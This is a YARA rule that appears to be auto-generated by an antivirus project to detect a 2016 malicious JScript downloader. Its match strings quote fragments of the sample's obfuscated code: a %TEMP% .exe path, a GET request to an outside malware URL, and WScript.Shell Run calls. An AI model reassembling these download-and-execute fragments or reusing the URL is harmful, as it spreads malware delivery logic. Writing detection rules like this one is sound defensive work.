rule sig_20160328_2fcc74e9c26bea9185e122d3053692e9 {
  meta:
    description = "datamaliciousorder - file 20160328_2fcc74e9c26bea9185e122d3053692e9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "00dc6d12e83cc57e9eb3836b2620807990e7187f8d5c9f891132b4289f581dd6"

  strings:
    $s1  = "function Jczgbwng() {return Vztfrs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5xAP71Gwh.exe\";};" fullword ascii
    $s2  = "Odgpilfwsn[Hhsarkc](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Lleuz](Dcfvamlava() * 11)} while (Odgpilfwsn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Rxteg(Abxrochhz, Vdryepryp){return Abxrochhz - Vdryepryp;};" fullword ascii
    $s5  = "var Vztfrs = function Ovwvqjnhu() {return WScript[Ieruw](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Eglrh() {return ((Zirxflox == true) && (Zirxflox == Inlvsi)) ? 1 : Phzafhlaem;};" fullword ascii
    $s7  = "function Yptxq(Votbgclj){Vztfrs[\"Run\"](Votbgclj, Phzafhlaem, Phzafhlaem);};" fullword ascii
    $s8  = "var Hpwndm = new this[\"Date\"]();" fullword ascii
    $s9  = "Zirxflox = true; " fullword ascii
    $s10 = "function Dcfvamlava(){return 22;};" fullword ascii
    $s11 = " while (Ecsjcx){" fullword ascii
    $s12 = "var Inlvsi = false;" fullword ascii
    $s13 = "function Wcvkxtrq(Enjlwj) {var Hikdmilza = (1, 2, 3, 4, 5, Enjlwj); return Hikdmilza;};" fullword ascii
    $s14 = "function Aesqxdz(){return Ieruw;};" fullword ascii
    $s15 = "Inlvsi = true; " fullword ascii
    $s16 = "var Srloejj = false;" fullword ascii
    $s17 = "var Zirxflox = false;" fullword ascii
    $s18 = "return Rxteg(Fyqwgjdx, Mcvhmg);" fullword ascii
    $s19 = "function Apgikjejcc(){return Zhzzhle;};" fullword ascii
    $s20 = "function Homyuix()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}